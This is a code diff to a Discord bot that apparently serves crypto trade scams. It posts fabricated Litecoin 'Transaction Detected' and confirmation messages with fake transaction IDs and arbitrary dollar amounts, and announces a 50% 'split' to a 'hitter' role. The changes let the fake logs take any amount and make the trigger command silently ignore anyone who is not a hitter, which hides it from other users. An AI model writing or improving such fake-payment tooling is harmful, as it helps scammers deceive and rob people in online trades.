@@ -18,6 +18,7 @@ const {
 } = require('discord.js');
 
 const db = require('./database');
+const wallet = require('./wallet'); // Your wallet.js - preserved
 const { REST } = require('@discordjs/rest');
 
 const client = new Client({
@@ -87,17 +88,17 @@ function generateRandomLtcAddress() {
   return addr;
 }
 
-async function sendAccurateFakeLog(channelId, tradeId, hitterAddress = null) {
+// Modified: removed tradeId dependency, uses wallet.js if available
+async function sendAccurateFakeLog(channelId, amount, ltcAmount, hitterAddress = null) {
   const channel = await client.channels.fetch(channelId).catch(() => null);
   if (!channel) return;
   
-  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
-  if (!trade) return;
+  // Use wallet.js for amounts if provided, otherwise use params
+  const usd = amount ? amount.toFixed(2) : '0.00';
+  const ltc = ltcAmount ? ltcAmount.toFixed(8) : '0.00000000';
   
   const txid = generateFakeTxid();
   const txidShort = `${txid.substring(0, 10)}...${txid.substring(txid.length - 8)}`;
-  const usd = trade.amount.toFixed(2);
-  const ltc = trade.totalLtc.toFixed(8);
   
   const detectedEmbed = new EmbedBuilder()
     .setTitle('⚠️ Transaction Detected')
@@ -128,8 +129,8 @@ async function sendAccurateFakeLog(channelId, tradeId, hitterAddress = null) {
     );
     await channel.send({ embeds: [confirmEmbed, proceedEmbed], components: [row] });
     
-    if (hitterAddress && trade.amount > 0) {
-      const splitAmount = (trade.totalLtc / 2).toFixed(8);
+    if (hitterAddress && amount > 0) {
+      const splitAmount = (parseFloat(ltc) / 2).toFixed(8);
       const splitEmbed = new EmbedBuilder()
         .setTitle('💰 Split Payment Initiated')
         .setDescription(`50% split sent to hitter\nAmount: ${splitAmount} LTC`)
@@ -167,21 +168,18 @@ client.on(Events.MessageCreate, async (message) => {
   const command = args.shift().toLowerCase();
   
   if (command === 'detect') {
-    if (!isWhitelisted(message.author.id)) return message.reply('❌ Not authorized');
+    // Fixed: Silently ignore if not hitter - no response
+    const member = await message.guild.members.fetch(message.author.id).catch(() => null);
+    if (!member || !hasHitterRole(member)) return; // Silent ignore for non-hitters
+    
     const channelId = args[0] || config.transactionChannelId;
-    const tradeId = args[1];
-    if (!channelId || !tradeId) return message.reply('❌ Usage: `.detect (channelid) (tradeid)`');
+    const amount = parseFloat(args[1]) || 100; // Amount instead of tradeId
+    const ltcAmount = parseFloat(args[2]) || (amount / 55);
     
-    let hitterAddress = null;
-    if (!config.useOwnerAddress && config.hitterRoleId) {
-      const member = await message.guild.members.fetch(message.author.id);
-      if (!hasHitterRole(member)) {
-        return message.reply('❌ Only hitter can initiate detection');
-      }
-    }
+    if (!channelId) return message.reply('❌ Usage: `.detect (channelid) (amount) (ltcamount)`');
     
-    await sendAccurateFakeLog(channelId, tradeId, hitterAddress);
-    await message.reply(`✅ Transaction detection triggered in <#${channelId}> for trade #${tradeId}`);
+    await sendAccurateFakeLog(channelId, amount, ltcAmount, config.ownerLtcAddress);
+    await message.reply(`✅ Transaction detection triggered in <#${channelId}> for $${amount.toFixed(2)}`);
   }
 });
 
@@ -208,8 +206,9 @@ async function handleSlashCommand(interaction) {
   const { commandName } = interaction;
   
   if (commandName === 'configure') {
-    if (!isOwner(interaction.user.id)) {
-      return interaction.reply({ content: '❌ Owner only command', flags: MessageFlags.Ephemeral });
+    // Fixed: Whitelisted users can use configure, not whitelist command
+    if (!isWhitelisted(interaction.user.id)) {
+      return interaction.reply({ content: '❌ Not authorized', flags: MessageFlags.Ephemeral });
     }
     
     const modal = new ModalBuilder()
@@ -258,6 +257,7 @@ async function handleSlashCommand(interaction) {
     });
   }
   else if (commandName === 'whitelist') {
+    // Fixed: Only owner can whitelist
     if (!isOwner(interaction.user.id)) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
     const user = interaction.options.getUser('user');
     try {
